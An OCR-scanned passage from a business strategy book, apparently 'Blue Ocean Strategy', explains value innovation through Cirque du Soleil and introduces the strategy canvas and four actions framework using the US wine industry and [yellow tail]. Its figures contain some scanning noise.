Semiconductor. As documented in Managing on\nthe Edge, two-thirds of the identified model firms in the book had fallen\n\nfrom their perches as industry leaders within five years of its publication.'*\n\nThe book Built to Last continued in the same footsteps. It sought out the\n“successful habits of visionary companies” that had a long-running track\nrecord of superior performance. To avoid the pitfalls of In Search of\nExcellence, however, the survey period of Built to Last was expanded to the\nentire life span of the companies, while its analysis was limited to firms\nmore than forty years old. Built to Last also became a bestseller.\n\nBut again, upon closer examination, deficiencies in some of the visionary\ncompanies spotlighted in Built to Last have come to light. As illustrated in\nthe book Creative Destruction, much of the success attributed to some of\nthe model companies in Built to Last was the result of industry-sector\nperformance rather than the companies themselves.!> For example,\nHewlett-Packard (HP) met the criteria of Built to Last by outperforming the\nmarket over the long term. In reality, while HP outperformed the market, so\ndid the entire computer-hardware industry. What’s more, HP did not even\noutperform the competition within the industry. Through this and other\nexamples, Creative Destruction questioned whether “visionary” companies\nthat continuously outperform the market have ever existed.\n\nIf there is no perpetually high-performing company and if the same\ncompany can be brilliant at one moment and wrongheaded at another, it\nappears that the company is not the appropriate unit of analysis in exploring\nthe roots of high performance and blue oceans.\n\nAs discussed earlier, history also shows that industries are constantly\nbeing created and expanded over time and that industry conditions and\nboundaries are not given; individual actors can shape them. Companies\nneed not compete head-on in a given industry space; Cirque du Soleil\ncreated a new market space in the entertainment sector, generating strong,\nprofitable growth as a result. It appears, then, that neither the company nor\nthe industry is the best unit of analysis in studying the roots of profitable\ngrowth.\n\nConsistent with this observation, our study shows that the strategic move,\nand not the company or the industry, is the right unit of analysis for\nexplaining the creation of blue oceans and sustained high performance. A\nstrategic move is the set of managerial actions and decisions involved in\nmaking a major market-creating business offering. Compaq, for example,\nwas acquired by Hewlett-Packard in 2001 and ceased to be an independent\ncompany. As a result, many people might judge the company as\nunsuccessful. This does not, however, invalidate the blue ocean strategic\nmoves that Compaq made in creating the server industry. These strategic\nmoves not only were a part of the company’s powerful comeback in the\nmid-1990s but also unlocked a new multibillion-dollar market space in\ncomputing.\n\nAppendix A, “A Sketch of the Historical Pattern of Blue Ocean\nCreation,” provides a snapshot overview of the history of three\nrepresentative US industries drawn from our database: the auto industry—\nhow we get to work; the computer industry—what we use at work; and the\ncinema industry—where we go after work for enjoyment. As shown in\nappendix A, no perpetually excellent company or industry is found. But a\nstriking commonality appears to exist across strategic moves that have\ncreated blue oceans and have led to new trajectories of strong, profitable\ngrowth.\n\nThe strategic moves we discuss—moves that have delivered products and\nservices that opened and captured new market space, with a significant leap\nin demand—contain great stories of profitable growth as well as thought-\nprovoking tales of missed opportunities by companies stuck in red oceans.\nWe built our study around these strategic moves to understand the pattern\nby which blue oceans are created and high performance achieved. The\noriginal research for our book covered more than one hundred fifty strategic\nmoves made from 1880 to 2000 in more than thirty industries. In\nconducting our research, we closely examined the relevant business players\nin each event. Industries ranged from hotels, the cinema, retail, airlines,\nenergy, computers, broadcasting, and construction to automobiles and steel.\nWe analyzed not only winning business players who created blue oceans\nbut also their less successful competitors.\n\nBoth within a given strategic move and across strategic moves, we\nsearched for convergence among the group that created blue oceans and\nwithin less successful players caught in the red ocean. We also searched for\ndivergence across these two groups. In so doing, we tried to discover the\ncommon factors leading to the creation of blue oceans and the key\ndifferences separating those winners from the mere survivors and the losers\nadrift in the red ocean.\n\nOur analysis of more than thirty industries confirms that neither industry\nnor organizational characteristics explain the distinction between the two\ngroups. In assessing industry, organizational, and strategic variables, we\nfound that the creation and capturing of blue oceans were achieved by small\nand large companies, by young and old managers, by companies in\nattractive and unattractive industries, by new entrants and established\nincumbents, by private and public companies, by companies in B2B and\nB2C industries, and by companies of diverse national origins.\n\nOur analysis failed to find any perpetually excellent company or industry.\nWhat we did find behind the seemingly idiosyncratic success stories,\nhowever, was a consistent and common pattern across strategic moves for\ncreating and capturing blue oceans. Whether it was Ford in 1908 with the\nModel T; GM in 1924 with cars styled to appeal to the emotions; CNN in\n1980 with real-time news 24/7; or Compaq Servers, Starbucks, Southwest\nAirlines, Cirque du Soleil, or more recently Salesforce.com—or, for that\nmatter, any of the other blue ocean moves in our study—the approach to\nstrategy in creating blue oceans was consistent across time regardless of\nindustry. Our research also reached out to embrace famous strategic moves\nin public-sector turnarounds. Here we found a strikingly similar pattern. As\nour database and research have continued to expand and grow over the last\nten years since the first edition of our book was published, we have\ncontinued to observe similar patterns.\nValue Innovation: The Cornerstone of Blue Ocean\nStrategy\n\nWhat consistently separated winners from losers in creating blue oceans was\ntheir approach to strategy. The companies caught in the red ocean followed a\nconventional approach, racing to beat the competition by building a\ndefensible position within the existing industry order.!° The creators of blue\noceans, surprisingly, didn’t use the competition as their benchmark.!7\nInstead, they followed a different strategic logic that we call value\ninnovation. Value innovation is the cornerstone of blue ocean strategy. We\ncall it value innovation because instead of focusing on beating the\ncompetition, you focus on making the competition irrelevant by creating a\nleap in value for buyers and your company, thereby opening up new and\nuncontested market space.\n\nValue innovation places equal emphasis on value and innovation. Value\nwithout innovation tends to focus on value creation on an incremental scale,\nsomething that improves value but is not sufficient to make you stand out in\nthe marketplace.!® Innovation without value tends to be technology-driven,\nmarket pioneering, or futuristic, often shooting beyond what buyers are\nready to accept and pay for.!° In this sense, it is important to distinguish\nbetween value innovation as opposed to technology innovation and market\npioneering. Our study shows that what separates winners from losers in\ncreating blue oceans is neither bleeding-edge technology nor “timing for\nmarket entry.” Sometimes these exist; more often, however, they do not.\nValue innovation occurs only when companies align innovation with utility,\nprice, and cost positions. If they fail to anchor innovation with value in this\nway, technology innovators and market pioneers often lay the eggs that other\ncompanies hatch.\n\nValue innovation is a new way of thinking about and executing strategy\nthat results in the creation of a blue ocean and a break from the competition.\nImportantly, value innovation defies one of the most commonly accepted\ndogmas of competition-based strategy: the value-cost trade-off.\" It is\nconventionally believed that companies can either create greater value to\ncustomers at a higher cost or create reasonable value at a lower cost. Here\nstrategy is seen as making a choice between differentiation and low cost.21\nIn contrast, those that seek to create blue oceans pursue differentiation and\nlow cost simultaneously.\n\nLet’s return to the example of Cirque du Soleil. Pursuing differentiation\nand low cost simultaneously lies at the heart of the entertainment experience\nit created. At the time of its debut, other circuses focused on benchmarking\none another and maximizing their share of already shrinking demand by\ntweaking traditional circus acts. This included trying to secure more famous\nclowns and lion tamers, a strategy that raised circuses’ cost structure without\nsubstantially altering the circus experience. The result was rising costs\nwithout rising revenues, and a downward spiral of overall circus demand.\n\nThese efforts were made irrelevant when Cirque du Soleil appeared.\nNeither an ordinary circus nor a classic theater production, Cirque du Soleil\npaid no heed to what the competition did. Instead of following the\nconventional logic of outpacing the competition by offering a better solution\nto the given problem—creating a circus with even greater fun and thrills—it\nsought to offer people the fun and thrill of the circus and the intellectual\nsophistication and artistic richness of the theater at the same time; hence, it\nredefined the problem itself22 By breaking the market boundaries of theater\nand circus, Cirque du Soleil gained a new understanding not only of circus\ncustomers but also of circus noncustomers: adult theater customers.\n\nThis led to a whole new circus concept that broke the value-cost trade-off\nand created a blue ocean of new market space. Consider the differences.\nWhereas other circuses focused on offering animal shows, hiring star\nperformers, presenting multiple show arenas in the form of three rings, and\npushing aisle concession sales, Cirque du Soleil did away with all these\nfactors. These factors had long been taken for granted in the traditional\ncircus industry, which never questioned their ongoing relevance. However,\nthere was increasing public discomfort with the use of animals. Moreover,\nanimal acts were one of the most expensive elements, including not only the\ncost of the animals but also their training, medical care, housing, insurance,\nand transportation.\n\nSimilarly, while the circus industry focused on featuring stars, in the mind\nof the public the so-called stars of the circus were trivial next to movie stars\nor famous singers. Again, they were a high-cost component carrying little\nsway with spectators. Gone, too, are three-ring venues. Not only did this\narrangement create angst among spectators as they rapidly switched their\ngaze from one ring to the other, but it also increased the number of\nperformers needed, with obvious cost implications. And although aisle\nconcession sales appeared to be a good way to generate revenue, in practice\nthe high prices discouraged audiences from making purchases and made\nthem feel they were being taken for a ride.\n\nThe lasting allure of the traditional circus came down to only three key\nfactors: the tent, the clowns, and the classic acrobatic acts such as the\nwheelman and short stunts. So Cirque du Soleil kept the clowns but shifted\ntheir humor from slapstick to a more enchanting, sophisticated style. It\nglamorized the tent, an element that, ironically, many circuses had begun to\nforfeit in favor of rented venues. Seeing that this unique venue symbolically\ncaptured the magic of the circus, Cirque du Soleil designed the classic\nsymbol of the circus with a glorious external finish and a higher level of\ncomfort, making its tents reminiscent of the grand epic circuses. Gone were\nthe sawdust and hard benches. Acrobats and other thrilling acts are retained,\nbut their roles were reduced and made more elegant by the addition of\nartistic flair and intellectual wonder to the acts.\n\nBy looking across the market boundary of theater, Cirque du Soleil also\noffered new noncircus factors, such as a story line and, with it, intellectual\nrichness, artistic music and dance, and multiple productions. These factors,\nentirely new creations for the circus industry, are drawn from the alternative\nlive entertainment industry of theater.\n\nUnlike traditional circus shows having a series of unrelated acts, for\nexample, Cirque du Soleil creations have a theme and story line, somewhat\nresembling a theater performance. Although the theme is vague (and\nintentionally so), it brings harmony and an intellectual element to the show\n—without limiting the potential for acts. Cirque also borrows ideas from\nBroadway shows. For example, it features multiple productions rather than\nthe traditional “one for all” shows. As with Broadway shows, too, each\nCirque du Soleil show has an original score and assorted music, which\ndrives the visual performance, lighting, and timing of the acts rather than the\nother way around. The shows feature abstract and spiritual dance, an idea\nderived from theater and ballet. By introducing these new factors into its\noffering, Cirque du Soleil has created more sophisticated shows.\n\nMoreover, by injecting the concept of multiple productions and by giving\npeople a reason to come to the circus more frequently, Cirque du Soleil\ndramatically increased demand.\n\nIn short, Cirque du Soleil offers the best of both circus and theater, and it\nhas eliminated or reduced everything else. By offering unprecedented utility,\nCirque du Soleil created a blue ocean and invented a new form of live\nentertainment, one that is markedly different from both traditional circus and\ntheater. At the same time, by eliminating many of the most costly elements\nof the circus, it dramatically reduced its cost structure, achieving both\ndifferentiation and low cost. Cirque strategically priced its tickets against\nthose of the theater, lifting the price point of the circus industry by several\nmultiples while still pricing its productions to capture the mass of adult\ncustomers, who were used to theater prices.\n\nFigure 1-2 depicts the differentiation— low cost dynamics underpinning\nvalue innovation.\n\nFIGURE 1-2\n\nValue innovation: The cornerstone of blue ocean strategy\n\nValue innovation is created in the region where a company’s actions\nfavorably affect both its cost structure and its value proposition to buyers.\nCost savings are made by eliminating and reducing the factors an industry\ncompetes on. Buyer value is lifted by raising and creating elements the\nindustry has never offered. Over time, costs are reduced further as scale\neconomies kick in due to the high sales volumes that superior value\ngenerates.\nValue\ninnovation\n\n0 Buyer value\n\nThe simultaneous pursuit of differentiation and low cost\n\nAs shown in figure 1-2, the creation of blue oceans is about driving costs\ndown while simultaneously driving value up for buyers. This is how a leap\nin value for both the company and its buyers is achieved. Because buyer\nvalue comes from the utility and price that the company offers to buyers and\nbecause the value to the company is generated from price and its cost\nstructure, value innovation is achieved only when the system of the\ncompany’s utility, price, and cost activities is properly aligned. To sustain\nvalue innovation, however, people working for and with the company need\nto support it. For value innovation to be a sustainable strategy, then, the\nalignment of the company’s utility, price, cost, and people is needed. It is\nthis whole-system approach that makes value innovation strategic rather\nthan operational or functional.\n\nIn contrast, innovations such as production innovations can be achieved at\nthe subsystem level without impacting the company’s overall strategy. An\ninnovation in the production process, for example, may lower a company’s\ncost structure to reinforce its existing cost leadership strategy without\nchanging the utility proposition of its offering. Although innovations of this\nsort may help to secure and even lift a company’s position in the existing\n\nmarket space, such a subsystem approach will rarely create a blue ocean of\nnew market space.\n\nIn this sense, value innovation is a distinct concept. It is about strategy\nthat embraces the entire system of a company’s activities.23 Value innovation\nrequires companies to orient the whole system toward achieving a /eap in\nvalue for both buyers and themselves. Absent such an integral approach,\n\ninnovation will remain divided from the core of strategy.”* Figure 1-3\noutlines the key defining features of red and blue ocean strategies.\n\nFIGURE 1-3\n\nRed ocean versus blue ocean strategy\n\nRed ocean strategy Blue ocean strategy\n\nCompete in existing market space. Create uncontested market space.\nBeat the competition. Make the competition irrelevant.\nExploit existing demand. Create and capture new demand.\n\nMake the value-cost trade-off. Break the value-cost trade-off.\n\nAlign the whole system of a firm’s activities Align the whole system of a firm’s\nwith its strategic choice of differentiation or activities in pursuit of differentiation\nlow cost. and low cost.\n\nCompetition-based red ocean strategy assumes that an industry’s structural\nconditions are given and that firms are forced to compete within them, an\nassumption based on what the academics call the structuralist view, or\n\nenvironmental determinism. In contrast, value innovation is based on the\n\nview that market boundaries and industry structure are not given and can be\nreconstructed by the actions and beliefs of industry players. We call this the\nreconstructionist view. In the red ocean, differentiation raises costs because\nfirms compete with the same best-practice rule. Here, the strategic choices\nfor firms are to pursue either differentiation or low cost. In the\nreconstructionist world, however, the strategic aim is to create new best-\npractice rules by breaking the existing value-cost trade-off and thereby\ncreating a blue ocean. (For more discussions on this, see appendix B, “Value\nInnovation: A Reconstructionist View of Strategy.”)\n\nCirque du Soleil broke the best practice rule of the circus industry,\nachieving both differentiation and low cost by reconstructing elements\nacross existing industry boundaries. Is Cirque du Soleil, then, really a circus,\nwith all that it eliminated, reduced, raised, and created? Or is it theater? And\nif it is theater, then what genre—a Broadway show, an opera, a ballet? It is\nnot clear. Cirque du Soleil reconstructed elements across these alternatives,\nand, in the end, it is simultaneously a little of all of them and none of any of\nthem in their entirety. It created a blue ocean of new, uncontested market\nspace.\nFormulating and Executing Blue Ocean Strategy\n\nAlthough economic conditions indicate the rising imperative of blue oceans,\nthere is a general belief that the odds of success are lower when companies\nventure beyond existing industry space.”° The issue is how to succeed in\nblue oceans. How can companies systematically maximize the opportunities\nwhile simultaneously minimizing the risks of formulating and executing blue\nocean strategy? If you lack an understanding of the opportunity-maximizing\nand risk-minimizing principles driving the creation and capture of blue\noceans, the odds will be lengthened against your blue ocean initiative.\n\nOf course, there is no such thing as a riskless strategy.”’ Strategy will\nalways involve both opportunity and risk, be it a red ocean or a blue ocean\ninitiative. But at present the playing field is dramatically unbalanced in favor\nof tools and analytical frameworks to succeed in red oceans. As long as this\nremains true, red oceans will continue to dominate companies’ strategic\nagendas even as the business imperative for creating blue oceans takes on\nnew urgency. Perhaps this explains why, despite prior calls for companies to\ngo beyond existing industry space, companies have yet to act seriously on\nthese recommendations.\n\nThis book seeks to address this imbalance by laying out a methodology to\nsupport our thesis. Here we present the principles and analytical frameworks\nto succeed in blue oceans.\n\nChapter 2 introduces the analytical tools and frameworks that are essential\nfor creating and capturing blue oceans. Although supplementary tools are\nintroduced in other chapters as needed, these basic analytics are used\nthroughout the book. Companies can make proactive changes in industry or\nmarket fundamentals through the purposeful application of these blue ocean\ntools and frameworks, which are grounded in the issues of both opportunity\nand risk. Subsequent chapters introduce the principles that drive the\nsuccessful formulation and implementation of blue ocean strategy and\nexplain how they, along with the analytics, are applied in action. There are\nfour guiding principles for the successful formulation of blue ocean strategy.\nChapters 3 through 6 address these in turn. Chapter 3 identifies the paths by\nwhich you can systematically create uncontested market space across diverse\nindustry domains, hence attenuating search risk. It teaches you how to make\nthe competition irrelevant by looking across the six conventional boundaries\nof competition to open up commercially important blue oceans. The six\npaths focus on looking across alternative industries, across strategic groups,\nacross buyer groups, across complementary product and service offerings,\nacross the functional-emotional orientation of an industry, and even across\ntime.\n\nChapter 4 shows how to design a company’s strategic planning process to\ngo beyond incremental improvements to create value innovations. It presents\nan alternative to the existing strategic planning process, which is often\ncriticized as a number-crunching exercise that keeps companies locked into\nmaking incremental improvements. This principle tackles planning risk.\nUsing a visualizing approach that drives you to focus on the big picture\nrather than to be submerged in numbers and jargon, this chapter proposes a\nfour-step process whereby you can build a strategy that creates and captures\nblue ocean opportunities.\n\nChapter 5 shows how to maximize the size of a blue ocean. To create the\ngreatest market of new demand, this chapter challenges the conventional\npractice of aiming for finer segmentation to better meet existing customer\npreferences. This practice often results in increasingly small target markets.\nInstead, this chapter shows you how to aggregate demand, not by focusing\non the differences that separate customers but by building on the powerful\ncommonalities across noncustomers to maximize the size of the blue ocean\nbeing created and new demand being unlocked, hence minimizing scale risk.\n\nChapter 6 lays out the design of a strategy that allows you not only to\nprovide a leap in value to the mass of buyers but also to build a viable\nbusiness model to produce and maintain profitable growth. It shows you how\nto ensure that your company builds a business model that profits from the\nblue ocean it is creating. It addresses business model risk. The chapter\narticulates the sequence in which you should create a strategy to ensure that\nboth you and your customers win as you create new business terrain. Such a\nstrategy follows the sequence of utility, price, cost, and adoption.\n\nChapters 7 through 10 turn to the principles that drive effective execution\nof blue ocean strategy. Specifically, chapter 7 introduces what we call\ntipping point leadership. Tipping point leadership shows managers how to\nmobilize an organization to overcome the key organizational hurdles that\nblock the implementation of a blue ocean strategy. It deals with\norganizational risk. It lays out how leaders and managers alike can surmount\nthe cognitive, resource, motivational, and political hurdles in spite of limited\ntime and resources in executing blue ocean strategy.\n\nChapter 8 argues for the integration of execution into strategy making,\nthus motivating people to act on and execute a blue ocean strategy in a\nsustained way deep in an organization. This chapter introduces what we call\nfair process. Because a blue ocean strategy perforce represents a departure\nfrom the status quo, this chapter shows how fair process facilitates both\nstrategy making and execution by mobilizing people for the voluntary\ncooperation needed to execute blue ocean strategy. It deals with management\nrisk associated with people’s attitudes and behaviors. People here include\nboth internal and external stakeholders who work for and with an\norganization.\n\nChapter 9, new in this expanded edition, tackles the overarching concept\nof alignment and the critical role it plays for the sustainability of a strategy.\nHere we provide a simple but comprehensive framework to fully develop\nand align an organization’s three strategy propositions from value to profit to\npeople. It deals with how to manage sustainability risk. While this chapter\nstarts with the importance of alignment for the sustainability of any strategy,\nwhether blue or red, it shows how alignment works in the context of blue\nocean strategy by illustrating and contrasting cases of success and failure.\n\nChapter 10 addresses the issue of renewal and the dynamic aspects of blue\nocean strategy at both the business level and the corporate level for\nmultibusiness firms. Here we expand our original discussion on how to\nmanage and monitor your individual business and your corporate portfolio\nover time to achieve continuing high performance. In so doing, this chapter\ndeals with the important issue of managing renewal risk so that the blue\nocean strategy process can become institutionalized rather than a one-off\noccurrence. This chapter shows how red and blue ocean strategies fit\ntogether and complement each other in the context of managing a corporate\nportfolio over time.\n\nFigure 1-4 highlights the eight principles driving the successful\nformulation and execution of blue ocean strategy and the risks that these\nprinciples attenuate.\nFIGURE 1-4\n\nThe eight principles of blue ocean strategy\n\nFormulation principles Risk factor each principle attenuates\nReconstruct market boundaries. ۷ Search risk\n\nFocus on the big picture, not the numbers. ۷ Planning risk\n\nReach beyond existing demand. “ Scale risk\n\nGet the strategic sequence right. “ Business model risk\n\nExecution principles Risk factor each principle attenuates\nOvercome key organizational hurdles. ۷ Organizational risk\n\nBuild execution into strategy. ۷ Management risk\n\nAlign the value, profit, and people propositions. ۷ Sustainability risk\n\nRenew blue oceans. ۷ Renewal risk\n\nLastly, we end our expanded edition with a new chapter where we zoom\nin on the ten most-common red ocean traps that keep organizations anchored\nin the red even as they set out to sail into the blue. Here we expressly\naddress how to avoid each of these traps. We highlight and set straight the\nmisconceptions behind these red ocean traps to ensure people have not only\nthe right framing but also the proper application of blue ocean strategy tools\nto achieve success in practice.\n\nLet’s now move on to chapter 2, where we lay out the basic analytical\ntools and frameworks that will be used throughout this book in the\nformulation and execution of blue ocean strategy.\n\nCHAPTER 2\n\nAnalytical Tools and Frameworks\n\nWE SPENT A DECADE DEVELOPING a set of analytical tools and frameworks\nin an attempt to make the formulation and execution of blue ocean strategy\nas systematic and actionable as competing in the red waters of known\nmarket space. These analytics fill a central void in the field of strategy,\nwhich has developed an impressive array of tools and frameworks to\ncompete in red oceans, such as the five forces for analyzing existing\nindustry conditions and three generic strategies, but has remained virtually\nsilent on practical tools to excel in blue oceans. Instead, executives have\nreceived calls to be brave and entrepreneurial, to learn from failure, and to\nseek out revolutionaries. Although thought provoking, these are not\nsubstitutes for analytics to navigate successfully in blue waters. In the\nabsence of analytics, executives cannot be expected to act on the call to\nbreak out of existing competition. Effective blue ocean strategy should be\nabout risk minimization and not risk taking.\n\nTo address this imbalance, we studied companies around the world and\ndeveloped practical methodologies in the quest of blue oceans. We then\napplied and tested these tools and frameworks in action by working with\ncompanies in their pursuit of blue oceans, enriching and refining them in\nthe process. The tools and frameworks presented here are used throughout\nthis book as we discuss the eight principles of formulating and executing\nblue ocean strategy. As a brief introduction to these tools and frameworks,\nlet’s look at one industry—the US wine industry—to see how these tools\ncan be applied in practice in the creation of blue oceans.\n\nHere is the situation. Up until 2000, the United States had the third\nlargest aggregate consumption of wine worldwide with an estimated $20\nbillion in sales. Yet despite its size, the industry was intensely competitive.\nCalifornia wines dominated the domestic market, capturing two-thirds of all\nUS wine sales. These wines competed head-to-head with imported wines\nfrom France, Italy, and Spain and New World wines from countries such as\nChile, Australia, and Argentina, which increasingly targeted the US market.\nAt the same time, the supply of wines was increasing from Oregon,\nWashington, and New York State and with newly mature vineyard plantings\nin California, the number of wines was exploding. Yet the US consumer\nbase had essentially remained stagnant. The United States remained stuck at\nthirty-first place in world per capita wine consumption.\n\nThe intense competition fueled ongoing industry consolidation. The top\neight companies produced more than 75 percent of the wine in the United\nStates, and the estimated one thousand six hundred other wineries at the\ntime produced the remaining 25 percent. The dominance of a few key\nplayers allowed them to leverage distributors to gain shelf space and put\nmillions of dollars into above-the-line marketing budgets. A simultaneous\nconsolidation of retailers and distributors was also underway across the\nUnited States, something that raised their bargaining power against the\nplethora of wine makers. Titanic battles were being fought for retail and\ndistribution space. It is no surprise that weak, poorly run companies were\nincreasingly being swept aside. Downward pressure on wine prices had set\nin.\n\nIn short, the US wine industry in 2000 faced intense competition,\nmounting price pressure, increasing bargaining power on the part of retail\nand distribution channels, and flat demand despite overwhelming choice.\nFollowing conventional strategic thinking, the industry was hardly\nattractive. For strategists, the critical question is, How do you break out of\nthis red ocean of bloody competition to make the competition irrelevant?\nHow do you open up and capture a blue ocean of uncontested market\nspace?\nTo address these questions, we turn to the strategy canvas, an analytic\nframework that is central to value innovation and the creation of blue\noceans.\nThe Strategy Canvas\n\nThe strategy canvas is both a diagnostic and an action framework for\nbuilding a compelling blue ocean strategy. It serves two purposes. First, it\ncaptures the current state of play in the known market space. This allows you\nto understand where the competition is currently investing, the factors the\nindustry currently competes on in products, service, and delivery, and what\ncustomers receive from the existing competitive offerings on the market.\nFigure 2-1 captures all this information in graphic form. The horizontal axis\ncaptures the range of factors the industry competes on and invests in.\n\nFIGURE 2-1\n\nThe strategy canvas of the US wine industry in the late 1990s\n\nHigh\nPremium wines\n/ ০৮০৮৭০০৬১৬৪ ‏+ۂ ۂ  تو‎ 17 জুল তত তত এতশত E _ Pao 血\n/.\\ ’\n4 Re Budget wines\nF 一 - 一 - 仁 - 一 - 一 -4-- 一 - 一 伟 一 - 一 - 仪\nLow\n| | | | |\nPrice Above-the-line Vineyard prestige Wine\nUse of enological marketing Aging and legacy Wine range\nterminology and quality complexity\n\ndistinctions in wine\ncommunication\n\nIn the case of the US wine industry, it had long competed on seven\nprincipal factors:\n\n* Price per bottle of wine\n\n¢ An elite, refined image in packaging, including labels announcing the\nwine medals won and the use of esoteric enological terminology to\nstress the art and science of wine making\n\n* Above-the-line marketing to raise consumer awareness in a crowded\nmarket and to encourage distributors and retailers to give prominence to\na particular wine house\n\n* Aging quality of wine\n\n* The prestige of a wine’s vineyard and its legacy (hence the appellations\nof estates and chateaux and references to the historic age of the\nestablishment)\n\n* The complexity and sophistication of a wine’s taste, including such\nthings as tannins and oak\n\ne A diverse range of wines to cover all varieties of grapes and consumer\npreferences from Chardonnay to Merlot, and so on\n\nThese factors were viewed as key to the promotion of wine as a unique\nbeverage for the informed wine drinker, worthy of special occasions.\n\nThat was essentially the underlying structure of the US wine industry\nfrom the market perspective. Now let’s turn to the vertical axis of the\nstrategy canvas, which captures the offering level that buyers receive across\nall these key competing factors. A high score means that a company offers\nbuyers more, and hence invests more, in that factor. In the case of price, a\nhigher score indicates a higher price. We can now plot the current offering of\nwineries across all these factors to understand wineries’ strategic profiles, or\nvalue curves. The value curve, the basic component of the strategy canvas, is\na graphic depiction of a company’s relative performance across its industry’s\nfactors of competition.\n\nFigure 2-1 shows that, although more than one thousand six hundred\nwineries participated in the US wine industry in 2000, from the buyer’s point\nof view there was enormous convergence in their value curves. Despite the\nplethora of competitors, when premium brand wines are plotted on the\nstrategy canvas, we discover that from the market point of view all of them\nessentially have the same strategic profile. They offered a high price and\npresented a high level of offering across all the key competing factors. Their\nstrategic profile follows a classic differentiation strategy. From the market\npoint of view, however, they are all different in the same way. On the other\nhand, budget wines also have the same essential strategic profile. Their price\nwas low, as was their offering across all the key competing factors. These are\nclassic low-cost players. Moreover, the value curves of premium and low-\ncost wines share the same basic shape. The two strategic groups’ strategies\nmarched in lockstep, but at different altitudes of offering level.\n\nTo set a company on a strong, profitable growth trajectory in the face of\nindustry conditions like these, it won’t work to benchmark competitors and\ntry to outcompete them by offering a little more for a little less. Such a\nstrategy may nudge sales up but will hardly drive a company to open up\nuncontested market space. Nor is conducting extensive customer research\nthe path to blue oceans. Our research found that customers can scarcely\nimagine how to create uncontested market space. Their insight also tends\ntoward the familiar “offer me more for less.” And what customers typically\nwant “more” of are those product and service features that the industry\ncurrently offers.\n\nTo fundamentally shift the strategy canvas of an industry, you must begin\nby reorienting your strategic focus from competitors to alternatives, and\nfrom customers to noncustomers of the industry.' To pursue both value and\nlow cost, you should resist the old logic of benchmarking competitors in the\nexisting field and choosing between differentiation and cost leadership. As\nyou shift your strategic focus from current competition to alternatives and\nnoncustomers, you gain insight into how to redefine the problem the industry\nfocuses on and thereby reconstruct buyer value elements that reside across\nindustry boundaries. Conventional strategic logic, by contrast, drives you to\noffer better solutions than your rivals to existing problems defined by your\nindustry.\n\nIn the case of the US wine industry, conventional wisdom caused wineries\nto focus on overdelivering on prestige and the quality of wine at its price\npoint. Overdelivery meant adding complexity to the wine based on taste\nprofiles shared by wine makers and reinforced by the wine show judging\nsystem. Wine makers, show judges, and knowledgeable drinkers concur that\ncomplexity—layered personality and characteristics that reflect the\nuniqueness of the soil, season, and wine maker’s skill in tannins, oak, and\naging processes—equates with quality.\n\nBy looking across alternatives, however, Casella Wines, an Australian\nwinery, redefined the problem of the wine industry to a new one: how to\nmake a fun and nontraditional wine that’s easy to drink for everyone. Why?\nIn looking at the demand side of the alternatives of beer, spirits, and ready-\nto-drink cocktails, which captured three times as many US consumer alcohol\nsales as wine at the time, Casella Wines found that the mass of American\nadults saw wine as a turnoff. It was intimidating and pretentious, and the\ncomplexity of wine’s taste created flavor challenges for the average person,\neven though it was the basis on which the industry fought to excel. With this\ninsight, Casella Wines was ready to explore how to redraw the strategic\nprofile of the US wine industry to create a blue ocean. To achieve this, it\nturned to the second basic analytic underlying blue oceans: the four actions\nframework.\nThe Four Actions Framework\n\nTo reconstruct buyer value elements in crafting a new value curve, we have\ndeveloped the four actions framework. As shown in figure 2-2, to break the\ntrade-off between differentiation and low cost and to create a new value\ncurve, there are four key questions to challenge an industry’s strategic logic\nand business model:\n\n* Which of the factors that the industry takes for granted should be\neliminated?\n\ne Which factors should be reduced well below the industry’s standard?\n\n* Which factors should be raised well above the industry’s standard?\n\ne Which factors should be created that the industry has never offered?\n\nFIGURE 2-2\n\nThe four actions framework\nReduce\nWhich factors should\nbe reduced well\nbelow the industry’s\nstandard?\n\nEliminate Create\nWhich of the factors Anew Which factors should\nthat the industry value be created that\n\ntakes for granted curve the industry has\nshould be eliminated? never offered?\n\nRaise\nWhich factors should\nbe raised well\nabove the industry's\nstandard?\n\nThe first question forces you to consider eliminating factors that\ncompanies in your industry have long competed on. Often those factors are\ntaken for granted even though they no longer have value or may even detract\nfrom value. Sometimes there is a fundamental change in what buyers value,\nbut companies that are focused on benchmarking one another do not act on,\nor even perceive, the change.\n\nThe second question forces you to determine whether products or services\nhave been overdesigned in the race to match and beat the competition. Here,\ncompanies overserve customers, increasing their cost structure for no gain.\n\nThe third question pushes you to uncover and eliminate the compromises\nyour industry forces customers to make. The fourth question helps you to\ndiscover entirely new sources of value for buyers and to create new demand\nand shift the strategic pricing of the industry.\n\nIt is by pursuing the first two questions (of eliminating and reducing) that\nyou gain insight into how to drop your cost structure vis-a-vis competitors.\nOur research has found that rarely do managers systematically set out to\n\neliminate and reduce their investments in factors that an industry competes\non. The result is mounting cost structures and complex business models. The\nsecond two factors, by contrast, provide you with insight into how to lift\nbuyer value and create new demand. Collectively, they allow you to\nsystematically explore how you can reconstruct buyer value elements across\nalternative industries to offer buyers an entirely new experience, while\nsimultaneously keeping your cost structure low. Of particular importance are\nthe actions of eliminating and creating, which push companies to go beyond\nvalue maximization exercises with existing factors of competition.\nEliminating and creating prompt companies to change the factors\nthemselves, hence making the existing rules of competition irrelevant.\n\nWhen you apply the four actions framework to the strategy canvas of your\nindustry, you get a revealing new look at old perceived truths. In the case of\nthe US wine industry, by thinking in terms of these four actions vis-a-vis the\ncurrent industry logic and looking across alternatives and noncustomers,\nCasella Wines created [yellow tail], a wine whose strategic profile broke\nfrom the competition and created a blue ocean. Instead of offering wine as\nwine, Casella created a social drink accessible to everyone: beer drinkers,\ncocktail drinkers, and traditional drinkers of wine. In the space of only two\nyears, the fun, social drink [yellow tail] emerged as the fastest-growing\nbrand in the histories of both the Australian and the US wine industries and\nthe number-one imported wine into the United States, surpassing the wines\nof France and Italy. By August 2003, it was the number-one red wine in a\n750-ml bottle sold in the United States, outstripping California labels. By\nmid-2003, [yellow tail]’s moving average annual sales were tracking at 4.5\nmillion cases. In the context of a global wine glut, [yellow tail] was racing to\nkeep up with sales. Today, ten years later, [yellow tail] is available in more\nthan fifty countries with more than 2.5 million glasses of [yellow tail]\nenjoyed around the world each day. In the space of a decade, it emerged as\n\none of the top-five most powerful wine brands in the world.\n\nWhat’s more, whereas large wine companies developed strong brands\nover decades of marketing investment, [yellow tail] leapfrogged tall\ncompetitors with no promotional campaign, mass media, or consumer\nadvertising for the initial years. It didn’t simply steal sales from competitors;\nit grew the market. [yellow tail] brought nonwine drinkers—beer and ready-\nto-drink cocktail consumers—into the wine market. Moreover, novice table\nwine drinkers started to drink wine more frequently, jug wine 